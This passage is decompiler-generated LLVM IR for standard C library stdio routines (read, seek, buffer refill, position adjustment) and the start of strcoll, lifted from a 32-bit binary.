  %v0_8057008 = phi i32 [ %v0_8056fee, %dec_label_pc_8056fee.dec_label_pc_8057007_crit_edge ], [ %v0_8057008.pre, %dec_label_pc_8056ff3.dec_label_pc_8057007_crit_edge ]
  %v0_8057007 = load i32, i32* @edx, align 4
  store i32 %v2_8057009.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805700e = load i32, i32* @esi, align 4
  %v5_805700f = inttoptr i32 %v2_8057009.pre-phi to i32*
  %v6_805700f = call i32 @__stdio_seek(i32 %v0_805700e, i32* %v5_805700f, i32 %v0_8057008, i32 %v0_8057007)
  store i32 %v6_805700f, i32* %eax.global-to-local, align 4
  %v2_8057017 = icmp slt i32 %v6_805700f, 0
  br i1 %v2_8057017, label %dec_label_pc_8057041, label %dec_label_pc_805701b

dec_label_pc_805701b:                             ; preds = %dec_label_pc_8057007
  %v0_805701b = load i32, i32* @esi, align 4
  %v1_805701b = inttoptr i32 %v0_805701b to i32*
  %v2_805701b = load i32, i32* %v1_805701b, align 4
  store i32 %v2_805701b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805701f = add i32 %v0_805701b, 44
  %v2_805701f = inttoptr i32 %v1_805701f to i32*
  store i32 0, i32* %v2_805701f, align 4
  %v0_8057026 = load i32, i32* @esi, align 4
  %v1_8057026 = add i32 %v0_8057026, 2
  %v2_8057026 = inttoptr i32 %v1_8057026 to i8*
  store i8 0, i8* %v2_8057026, align 1
  %v0_805702a = load i32, i32* %eax.global-to-local, align 4
  %v1_805702a = and i32 %v0_805702a, -72
  store i32 %v1_805702a, i32* %eax.global-to-local, align 4
  %v1_805702d = trunc i32 %v1_805702a to i16
  %v2_805702d = load i32, i32* @esi, align 4
  %v3_805702d = inttoptr i32 %v2_805702d to i16*
  store i16 %v1_805702d, i16* %v3_805702d, align 2
  %v0_8057030 = load i32, i32* @esi, align 4
  %v1_8057030 = add i32 %v0_8057030, 8
  %v2_8057030 = inttoptr i32 %v1_8057030 to i32*
  %v3_8057030 = load i32, i32* %v2_8057030, align 4
  store i32 %v3_8057030, i32* %eax.global-to-local, align 4
  %v2_8057033 = add i32 %v0_8057030, 16
  %v3_8057033 = inttoptr i32 %v2_8057033 to i32*
  store i32 %v3_8057030, i32* %v3_8057033, align 4
  %v0_8057036 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057036 = load i32, i32* @esi, align 4
  %v2_8057036 = add i32 %v1_8057036, 20
  %v3_8057036 = inttoptr i32 %v2_8057036 to i32*
  store i32 %v0_8057036, i32* %v3_8057036, align 4
  %v0_8057039 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057039 = load i32, i32* @esi, align 4
  %v2_8057039 = add i32 %v1_8057039, 24
  %v3_8057039 = inttoptr i32 %v2_8057039 to i32*
  store i32 %v0_8057039, i32* %v3_8057039, align 4
  %v0_805703c = load i32, i32* %eax.global-to-local, align 4
  %v1_805703c = load i32, i32* @esi, align 4
  %v2_805703c = add i32 %v1_805703c, 28
  %v3_805703c = inttoptr i32 %v2_805703c to i32*
  store i32 %v0_805703c, i32* %v3_805703c, align 4
  br label %dec_label_pc_8057044

dec_label_pc_8057041:                             ; preds = %dec_label_pc_8057007, %dec_label_pc_8056ff3, %dec_label_pc_8056fde
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057044

dec_label_pc_8057044:                             ; preds = %dec_label_pc_805701b, %dec_label_pc_8057041
  br i1 %v1_8056fb8, label %dec_label_pc_8057059, label %dec_label_pc_8057048

dec_label_pc_8057048:                             ; preds = %dec_label_pc_8057044
  %v2_805704c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805704c, i32* @eax, align 4
  %v3_8057051 = call i32 @__pthread_return_void(i32 %v2_805704c, i32 1)
  store i32 %v3_8057051, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057059

dec_label_pc_8057059:                             ; preds = %dec_label_pc_8057044, %dec_label_pc_8056fa0, %dec_label_pc_8057048
  %v0_805705c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805705c, i32* %eax.global-to-local, align 4
  store i32 %v0_8056f7f, i32* @ebx, align 4
  store i32 %v0_8056f7e, i32* @esi, align 4
  store i32 %v0_8056f7d, i32* @edi, align 4
  store i32 %v0_8056f7c, i32* @ebp, align 4
  ret i32 %v0_805705c

; uselistorder directives
  uselistorder i32 %v2_8057009.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8056fee, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 64, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 (i32)* @__pthread_return_0, { 31, 18, 17, 16, 15, 14, 13, 12, 3, 30, 33, 9, 10, 2, 1, 0, 6, 8, 5, 11, 24, 23, 22, 26, 25, 7, 21, 32, 4, 20, 19, 29, 28, 27 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 55, 54, 51, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 1, 0, 53, 52, 59, 58, 11, 10, 13, 12, 5, 4, 9, 8, 3, 2, 15, 14, 40, 39, 38, 37, 36, 35, 44, 43, 42, 41, 7, 6, 34, 33, 57, 56, 32, 31, 30, 29, 50, 49, 48, 47, 46, 45 }
  uselistorder i32 134566343, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 23, 14, 15, 16, 17, 24, 25, 26, 18, 19 }
  uselistorder i32 52, { 8, 1, 13, 2, 3, 4, 5, 14, 15, 6, 11, 7, 9, 16, 12, 10, 0 }
  uselistorder i32 22, { 8, 15, 3, 4, 5, 6, 11, 14, 13, 9, 10, 12, 16, 7, 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057059, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057044, { 1, 0 }
  uselistorder label %dec_label_pc_8057007, { 1, 0 }
  uselistorder label %dec_label_pc_8056fd9, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057064 = load i32, i32* @ebx, align 4
  store i32 %v0_8057064, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_805706a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805706a, i32* @ebx, align 4
  %v1_8057072 = bitcast i16* %arg1 to i8*
  %v2_8057072 = load i8, i8* %v1_8057072, align 1
  %v3_8057072 = and i8 %v2_8057072, 4
  %v4_8057072 = icmp eq i8 %v3_8057072, 0
  %v1_8057075 = icmp eq i1 %v4_8057072, false
  br i1 %v1_8057075, label %dec_label_pc_80570ad, label %dec_label_pc_8057077

dec_label_pc_8057077:                             ; preds = %entry
  %v2_8057077 = icmp slt i32 %arg3, 0
  %v3_805707e = select i1 %v2_8057077, i32 2147483647, i32 %arg3
  %v1_8057087 = add i32 %v4_805706a, 4
  %v2_8057087 = inttoptr i32 %v1_8057087 to i32*
  %v3_8057087 = load i32, i32* %v2_8057087, align 4
  %v3_805708a = inttoptr i32 %arg2 to i32*
  %v4_805708a = call i32 @__libc_read(i32 %v3_8057087, i32* %v3_805708a, i32 %v3_805707e)
  store i32 %v4_805708a, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v4_805708a, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_80570ad, label %dec_label_pc_8057099

dec_label_pc_8057099:                             ; preds = %dec_label_pc_8057077
  %v1_8057092 = icmp eq i32 %v4_805708a, 0
  %v4_8057097 = icmp eq i1 %v1_8057092, false
  %v0_8057099 = load i32, i32* @ebx, align 4
  %v1_8057099 = inttoptr i32 %v0_8057099 to i32*
  %v2_8057099 = load i32, i32* %v1_8057099, align 4
  br i1 %v4_8057097, label %dec_label_pc_80570a5, label %dec_label_pc_805709d

dec_label_pc_805709d:                             ; preds = %dec_label_pc_8057099
  %v1_805709d = or i32 %v2_8057099, 4
  %v1_80570a0 = trunc i32 %v1_805709d to i16
  %v3_80570a0 = inttoptr i32 %v0_8057099 to i16*
  store i16 %v1_80570a0, i16* %v3_80570a0, align 2
  br label %dec_label_pc_80570ad

dec_label_pc_80570a5:                             ; preds = %dec_label_pc_8057099
  %v1_80570a5 = or i32 %v2_8057099, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_80570aa = trunc i32 %v1_80570a5 to i16
  %v3_80570aa = inttoptr i32 %v0_8057099 to i16*
  store i16 %v1_80570aa, i16* %v3_80570aa, align 2
  br label %dec_label_pc_80570ad

dec_label_pc_80570ad:                             ; preds = %dec_label_pc_8057077, %entry, %dec_label_pc_805709d, %dec_label_pc_80570a5
  %v0_80570ae = load i32, i32* %ecx.global-to-local, align 4
  %v2_80570b1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80570b1, i32* @ebx, align 4
  ret i32 %v0_80570ae

; uselistorder directives
  uselistorder i32 %v4_805708a, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_read, { 1, 0, 2 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80570ad, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_80570bc = ptrtoint i16* %arg1 to i32
  store i32 %v4_80570bc, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80570c4 = load i16, i16* %arg1, align 2
  %v3_80570c4 = zext i16 %v2_80570c4 to i32
  store i32 %v3_80570c4, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_80570c4, 4
  %v1_80570c9 = zext i16 %tmp to i32
  %v2_80570c9 = icmp eq i16 %tmp, 0
  br i1 %v2_80570c9, label %dec_label_pc_80570f8, label %dec_label_pc_80570ce

dec_label_pc_80570ce:                             ; preds = %entry
  %v1_80570d0 = add nsw i32 %v1_80570c9, -1
  %v8_80570d0 = icmp eq i32 %v1_80570d0, 0
  store i32 %v1_80570d0, i32* @edx, align 4
  br i1 %v8_80570d0, label %dec_label_pc_80570f8, label %dec_label_pc_80570d3

dec_label_pc_80570d3:                             ; preds = %dec_label_pc_80570ce
  %v3_80570d3 = and i32 %v3_80570c4, 2048
  %v4_80570d3 = icmp eq i32 %v3_80570d3, 0
  br i1 %v4_80570d3, label %dec_label_pc_80570f8, label %dec_label_pc_80570d8

dec_label_pc_80570d8:                             ; preds = %dec_label_pc_80570d3
  %v6_80570d8 = sub nsw i32 1, %v1_80570c9
  %v7_80570d8 = and i32 %v1_80570d0, %v6_80570d8
  %v8_80570d8 = icmp slt i32 %v7_80570d8, 0
  %v9_80570d8 = icmp eq i16 %tmp, 2
  %v10_80570d8 = icmp ult i16 %tmp, 2
  %v3_80570db = icmp eq i1 %v10_80570d8, %v8_80570d8
  %v4_80570db = icmp eq i1 %v9_80570d8, false
  %v5_80570db = and i1 %v4_80570db, %v3_80570db
  br i1 %v5_80570db, label %dec_label_pc_805714c, label %dec_label_pc_80570dd

dec_label_pc_80570dd:                             ; preds = %dec_label_pc_80570d8
  %v1_80570dd = add i32 %v4_80570bc, 40
  %v2_80570dd = inttoptr i32 %v1_80570dd to i32*
  %v3_80570dd = load i32, i32* %v2_80570dd, align 4
  %v4_80570dd = icmp eq i32 %v3_80570dd, 0
  %v1_80570e1 = icmp eq i1 %v4_80570dd, false
  br i1 %v1_80570e1, label %dec_label_pc_805714c, label %dec_label_pc_80570e3

dec_label_pc_80570e3:                             ; preds = %dec_label_pc_80570dd
  %v1_80570e3 = add i32 %v4_80570bc, 3
  %v2_80570e3 = inttoptr i32 %v1_80570e3 to i8*
  %v3_80570e3 = load i8, i8* %v2_80570e3, align 1
  %v4_80570e3 = zext i8 %v3_80570e3 to i32
  %v2_80570e7 = sub nsw i32 %v1_80570d0, %v4_80570e3
  %v1_80570e9 = add i32 %v4_80570bc, 44
  %v2_80570e9 = inttoptr i32 %v1_80570e9 to i32*
  %v3_80570e9 = load i32, i32* %v2_80570e9, align 4
  %v1_80570ed = add nsw i32 %v2_80570e7, -1
  %tmp11 = icmp slt i32 %v3_80570e9, 1
  br i1 %tmp11, label %dec_label_pc_80570f8, label %dec_label_pc_80570f2

dec_label_pc_80570f2:                             ; preds = %dec_label_pc_80570e3
  %v1_80570f2 = add i32 %v4_80570bc, 2
  %v2_80570f2 = inttoptr i32 %v1_80570f2 to i8*
  %v3_80570f2 = load i8, i8* %v2_80570f2, align 1
  %v4_80570f2 = zext i8 %v3_80570f2 to i32
  %v2_80570f6 = sub nsw i32 %v1_80570ed, %v4_80570f2
  br label %dec_label_pc_80570f8

dec_label_pc_80570f8:                             ; preds = %dec_label_pc_80570e3, %dec_label_pc_80570d3, %dec_label_pc_80570ce, %entry, %dec_label_pc_80570f2
  %v0_805710d = phi i32 [ %v1_80570ed, %dec_label_pc_80570e3 ], [ %v1_80570d0, %dec_label_pc_80570d3 ], [ 0, %dec_label_pc_80570ce ], [ 0, %entry ], [ %v2_80570f6, %dec_label_pc_80570f2 ]
  %v2_80570f8 = and i32 %v3_80570c4, 64
  %v3_80570f8 = icmp eq i32 %v2_80570f8, 0
  %storemerge.in.in.v = select i1 %v3_80570f8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_80570bc
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8057105 = add i32 %v4_80570bc, 16
  %v3_8057105 = inttoptr i32 %v2_8057105 to i32*
  %v4_8057105 = load i32, i32* %v3_8057105, align 4
  %v5_8057105 = sub i32 %storemerge, %v4_8057105
  %v1_8057108 = inttoptr i32 %arg2 to i32*
  %v2_8057108 = load i32, i32* %v1_8057108, align 4
  store i32 %v2_8057108, i32* %ecx.global-to-local, align 4
  %v1_805710a = add i32 %arg2, 4
  %v2_805710a = inttoptr i32 %v1_805710a to i32*
  %v3_805710a = load i32, i32* %v2_805710a, align 4
  store i32 %v3_805710a, i32* %ebx.global-to-local, align 4
  %v2_805710d = add i32 %v5_8057105, %v0_805710d
  store i32 %v2_805710d, i32* %esi.global-to-local, align 4
  %v5_8057121 = sub i32 %v2_8057108, %v2_805710d
  %v10_8057121 = icmp ult i32 %v2_8057108, %v2_805710d
  %v6_8057125 = zext i1 %v10_8057121 to i32
  %tmp13 = icmp slt i32 %v2_805710d, 0
  %v2_8057112.neg = zext i1 %tmp13 to i32
  %v7_8057125 = add i32 %v3_805710a, %v2_8057112.neg
  %v8_8057125 = add i32 %v7_8057125, %v6_8057125
  store i32 %v8_8057125, i32* @edx, align 4
  store i32 %v5_8057121, i32* %v1_8057108, align 4
  %v0_805712b = load i32, i32* @edx, align 4
  %v1_805712b = load i32, i32* %edi.global-to-local, align 4
  %v2_805712b = add i32 %v1_805712b, 4
  %v3_805712b = inttoptr i32 %v2_805712b to i32*
  store i32 %v0_805712b, i32* %v3_805712b, align 4
  %v0_805712e = load i32, i32* %edi.global-to-local, align 4
  %v1_805712e = add i32 %v0_805712e, 4
  %v2_805712e = inttoptr i32 %v1_805712e to i32*
  %v3_805712e = load i32, i32* %v2_805712e, align 4
  %v4_805712e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8057131 = icmp slt i32 %v3_805712e, %v4_805712e
  br i1 %v5_8057131, label %dec_label_pc_805713b, label %dec_label_pc_8057133

dec_label_pc_8057133:                             ; preds = %dec_label_pc_80570f8
  %v8_8057133 = icmp sgt i32 %v3_805712e, %v4_805712e
  br i1 %v8_8057133, label %dec_label_pc_8057139, label %dec_label_pc_8057135

dec_label_pc_8057135:                             ; preds = %dec_label_pc_8057133
  %v1_8057135 = inttoptr i32 %v0_805712e to i32*
  %v2_8057135 = load i32, i32* %v1_8057135, align 4
  %v3_8057135 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8057135, %v3_8057135
  br i1 %tmp14, label %dec_label_pc_8057139, label %dec_label_pc_805713b

dec_label_pc_8057139:                             ; preds = %dec_label_pc_8057135, %dec_label_pc_8057133
  %v0_8057139 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057139 = sub i32 0, %v0_8057139
  store i32 %v1_8057139, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805713b

dec_label_pc_805713b:                             ; preds = %dec_label_pc_8057135, %dec_label_pc_80570f8, %dec_label_pc_8057139
  %v0_805713b = load i32, i32* %esi.global-to-local, align 4
  %v2_805713b = icmp slt i32 %v0_805713b, 0
  %v1_805713d = icmp eq i1 %v2_805713b, false
  br i1 %v1_805713d, label %dec_label_pc_805714f, label %dec_label_pc_805713f

dec_label_pc_805713f:                             ; preds = %dec_label_pc_805713b
  %v1_805713f = call i32 @__errno_location(i32 %v2_805710d)
  %v1_8057144 = inttoptr i32 %v1_805713f to i32*
  store i32 75, i32* %v1_8057144, align 4
  %v0_8057152.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805714f

dec_label_pc_805714c:                             ; preds = %dec_label_pc_80570dd, %dec_label_pc_80570d8
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805714f

dec_label_pc_805714f:                             ; preds = %dec_label_pc_805713b, %dec_label_pc_805713f, %dec_label_pc_805714c
  %v0_8057152 = phi i32 [ %v0_805713b, %dec_label_pc_805713b ], [ %v0_8057152.pre, %dec_label_pc_805713f ], [ -1, %dec_label_pc_805714c ]
  ret i32 %v0_8057152

; uselistorder directives
  uselistorder i32 %v4_805712e, { 1, 0 }
  uselistorder i32 %v3_805712e, { 1, 0 }
  uselistorder i32 %v2_805710d, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_80570d0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_80570bc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805714f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805713b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80570f8, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8057158 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8057160 = add i32 %arg1, 8
  %v2_8057160 = inttoptr i32 %v1_8057160 to i32*
  %v3_8057160 = load i32, i32* %v2_8057160, align 4
  store i32 %v3_8057160, i32* %edx.global-to-local, align 4
  %v1_8057163 = add i32 %arg1, 12
  %v2_8057163 = inttoptr i32 %v1_8057163 to i32*
  %v3_8057163 = load i32, i32* %v2_8057163, align 4
  %v2_8057166 = sub i32 %v3_8057163, %v3_8057160
  %v3_805716b = inttoptr i32 %arg1 to i16*
  %v4_805716b = call i32 @__stdio_READ(i16* %v3_805716b, i32 %v3_8057160, i32 %v2_8057166)
  %v0_8057170 = load i32, i32* @ebx, align 4
  %v1_8057170 = add i32 %v0_8057170, 8
  %v2_8057170 = inttoptr i32 %v1_8057170 to i32*
  %v3_8057170 = load i32, i32* %v2_8057170, align 4
  store i32 %v3_8057170, i32* %edx.global-to-local, align 4
  %v2_8057173 = add i32 %v0_8057170, 16
  %v3_8057173 = inttoptr i32 %v2_8057173 to i32*
  store i32 %v3_8057170, i32* %v3_8057173, align 4
  %v0_8057176 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057176 = add i32 %v0_8057176, %v4_805716b
  store i32 %v2_8057176, i32* %edx.global-to-local, align 4
  %v1_8057178 = load i32, i32* @ebx, align 4
  %v2_8057178 = add i32 %v1_8057178, 20
  %v3_8057178 = inttoptr i32 %v2_8057178 to i32*
  store i32 %v2_8057176, i32* %v3_8057178, align 4
  store i32 %v0_8057158, i32* @ebx, align 4
  ret i32 %v4_805716b

; uselistorder directives
  uselistorder i32 %v4_805716b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8057180 = load i32, i32* @ebx, align 4
  %v4_8057184 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8057184, i32* @ebx, align 4
  %v2_805718c = load i16, i16* %arg1, align 2
  %v3_805718c = zext i16 %v2_805718c to i32
  %v2_805718f = and i32 %v3_805718c, %arg2
  %v3_805718f = icmp eq i32 %v2_805718f, 0
  %v1_8057191 = icmp eq i1 %v3_805718f, false
  br i1 %v1_8057191, label %dec_label_pc_805719f, label %dec_label_pc_8057193

dec_label_pc_8057193:                             ; preds = %entry
  %v1_8057193 = and i32 %v3_805718c, 2176
  %v2_8057193 = icmp eq i32 %v1_8057193, 0
  %v1_8057198 = icmp eq i1 %v2_8057193, false
  br i1 %v1_8057198, label %dec_label_pc_80571a6, label %dec_label_pc_805719a

dec_label_pc_805719a:                             ; preds = %dec_label_pc_8057193
  %v2_805719a = or i32 %v3_805718c, %arg2
  %v1_805719c = trunc i32 %v2_805719a to i16
  store i16 %v1_805719c, i16* %arg1, align 2
  %v0_805719f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805719f

dec_label_pc_805719f:                             ; preds = %entry, %dec_label_pc_805719a
  %v0_80571c5 = phi i32 [ %v4_8057184, %entry ], [ %v0_805719f.pre, %dec_label_pc_805719a ]
  %v1_805719f = inttoptr i32 %v0_80571c5 to i16*
  %v2_805719f = load i16, i16* %v1_805719f, align 2
  %v2_80571a2 = and i16 %v2_805719f, 16
  %v3_80571a2 = icmp eq i16 %v2_80571a2, 0
  br i1 %v3_80571a2, label %dec_label_pc_80571be, label %dec_label_pc_80571a6

dec_label_pc_80571a6:                             ; preds = %dec_label_pc_805719f, %dec_label_pc_8057193
  %v1_80571a6 = call i32 @__errno_location(i32 %v0_8057180)
  %v1_80571ab = inttoptr i32 %v1_80571a6 to i32*
  store i32 9, i32* %v1_80571ab, align 4
  br label %dec_label_pc_80571b1

dec_label_pc_80571b1:                             ; preds = %dec_label_pc_80571c2, %dec_label_pc_80571a6
  %v0_80571b1 = load i32, i32* @ebx, align 4
  %v1_80571b1 = inttoptr i32 %v0_80571b1 to i32*
  %v2_80571b1 = load i32, i32* %v1_80571b1, align 4
  %v1_80571b3 = or i32 %v2_80571b1, 8
  %v1_80571b6 = trunc i32 %v1_80571b3 to i16
  %v3_80571b6 = inttoptr i32 %v0_80571b1 to i16*
  store i16 %v1_80571b6, i16* %v3_80571b6, align 2
  br label %dec_label_pc_80571ea

dec_label_pc_80571be:                             ; preds = %dec_label_pc_805719f
  %v2_80571be = and i16 %v2_805719f, 64
  %v3_80571be = icmp eq i16 %v2_80571be, 0
  br i1 %v3_80571be, label %dec_label_pc_80571e0, label %dec_label_pc_80571c2

dec_label_pc_80571c2:                             ; preds = %dec_label_pc_80571be
  %v2_80571c6 = call i32 @__stdio_wcommit(i32 %v0_80571c5)
  %v1_80571ce = icmp eq i32 %v2_80571c6, 0
  %v1_80571d0 = icmp eq i1 %v1_80571ce, false
  br i1 %v1_80571d0, label %dec_label_pc_80571b1, label %dec_label_pc_80571d2

dec_label_pc_80571d2:                             ; preds = %dec_label_pc_80571c2
  %v0_80571d2 = load i32, i32* @ebx, align 4
  %v1_80571d2 = add i32 %v0_80571d2, 8
  %v2_80571d2 = inttoptr i32 %v1_80571d2 to i32*
  %v3_80571d2 = load i32, i32* %v2_80571d2, align 4
  %v2_80571d5 = add i32 %v0_80571d2, 28
  %v3_80571d5 = inttoptr i32 %v2_80571d5 to i32*
  store i32 %v3_80571d2, i32* %v3_80571d5, align 4
  %v0_80571d8 = load i32, i32* @ebx, align 4
  %v1_80571d8 = inttoptr i32 %v0_80571d8 to i32*
  %v2_80571d8 = load i32, i32* %v1_80571d8, align 4
  %v2_80571d8.tr = trunc i32 %v2_80571d8 to i16
  %v1_80571dd = and i16 %v2_80571d8.tr, -65
  %v3_80571dd = inttoptr i32 %v0_80571d8 to i16*
  store i16 %v1_80571dd, i16* %v3_80571dd, align 2
  %v0_80571e0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80571e0

dec_label_pc_80571e0:                             ; preds = %dec_label_pc_80571be, %dec_label_pc_80571d2
  %v2_80571e5 = phi i32 [ %v0_80571c5, %dec_label_pc_80571be ], [ %v0_80571e0.pre, %dec_label_pc_80571d2 ]
  %v1_80571e0 = inttoptr i32 %v2_80571e5 to i32*
  %v2_80571e0 = load i32, i32* %v1_80571e0, align 4
  %v1_80571e2 = or i32 %v2_80571e0, 1
  %v1_80571e5 = trunc i32 %v1_80571e2 to i16
  %v3_80571e5 = inttoptr i32 %v2_80571e5 to i16*
  store i16 %v1_80571e5, i16* %v3_80571e5, align 2
  br label %dec_label_pc_80571ea

dec_label_pc_80571ea:                             ; preds = %dec_label_pc_80571b1, %dec_label_pc_80571e0
  %storemerge = phi i32 [ 0, %dec_label_pc_80571e0 ], [ -1, %dec_label_pc_80571b1 ]
  %v2_80571ea = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80571ea, i32* @edx, align 4
  store i32 %v0_8057180, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_805718c, { 0, 2, 1 }
  uselistorder i32 %v0_8057180, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 0, { 0, 8, 2, 1, 9, 6, 10, 7, 11, 12, 13, 14, 15, 16, 17, 3, 4, 5 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80571ea, { 1, 0 }
  uselistorder label %dec_label_pc_80571e0, { 1, 0 }
  uselistorder label %dec_label_pc_805719f, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80571fc = add i32 %tmp5, 4
  %v2_80571fc = inttoptr i32 %v1_80571fc to i32*
  %v3_80571fc = load i32, i32* %v2_80571fc, align 4
  %v2_80571ff = load i32, i32* %arg2, align 4
  %v1_8057205 = add i32 %arg1, 4
  %v2_8057205 = inttoptr i32 %v1_8057205 to i32*
  %v3_8057205 = load i32, i32* %v2_8057205, align 4
  %v4_8057208 = call i32 @__libc_lseek64(i32 %v3_8057205, i32 %v2_80571ff, i32 %v3_80571fc, i32 %arg3)
  %v0_8057210 = load i32, i32* @edx, align 4
  %v2_8057210 = icmp slt i32 %v0_8057210, 0
  store i32 %v4_8057208, i32* %ecx.global-to-local, align 4
  br i1 %v2_8057210, label %dec_label_pc_805721d, label %dec_label_pc_8057216

dec_label_pc_8057216:                             ; preds = %entry
  %v1_8057216 = load i32, i32* @ebx, align 4
  %v2_8057216 = inttoptr i32 %v1_8057216 to i32*
  store i32 %v4_8057208, i32* %v2_8057216, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_805721a = load i32, i32* @edx, align 4
  %v1_805721a = load i32, i32* @ebx, align 4
  %v2_805721a = add i32 %v1_805721a, 4
  %v3_805721a = inttoptr i32 %v2_805721a to i32*
  store i32 %v0_805721a, i32* %v3_805721a, align 4
  %v0_805721e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805721d

dec_label_pc_805721d:                             ; preds = %entry, %dec_label_pc_8057216
  %v0_805721e = phi i32 [ %v4_8057208, %entry ], [ %v0_805721e.pre, %dec_label_pc_8057216 ]
  ret i32 %v0_805721e

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_805721d, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8057226 = ptrtoint i8* %arg1 to i32
  %v4_805722e.pre = load i32, i32* @eax, align 4
  %v8_805722e.pre = load i1, i1* @df, align 1
  %v9_805722e = select i1 %v8_805722e.pre, i32 -1, i32 1
  br label %dec_label_pc_805722e

dec_label_pc_805722e:                             ; preds = %dec_label_pc_8057232, %entry
  %v20_805722f = phi i32 [ %v23_805722f, %dec_label_pc_8057232 ], [ %arg2, %entry ]
  %v4_805722e = phi i32 [ %v6_805722e, %dec_label_pc_8057232 ], [ %v4_805722e.pre, %entry ]
  %v7_805722e = phi i32 [ %v10_805722e, %dec_label_pc_8057232 ], [ %v4_8057226, %entry ]
  %v1_805722e = inttoptr i32 %v7_805722e to i8*
  %v2_805722e = load i8, i8* %v1_805722e, align 1
  %v3_805722f = inttoptr i32 %v20_805722f to i8*
  %v4_805722f = load i8, i8* %v3_805722f, align 1
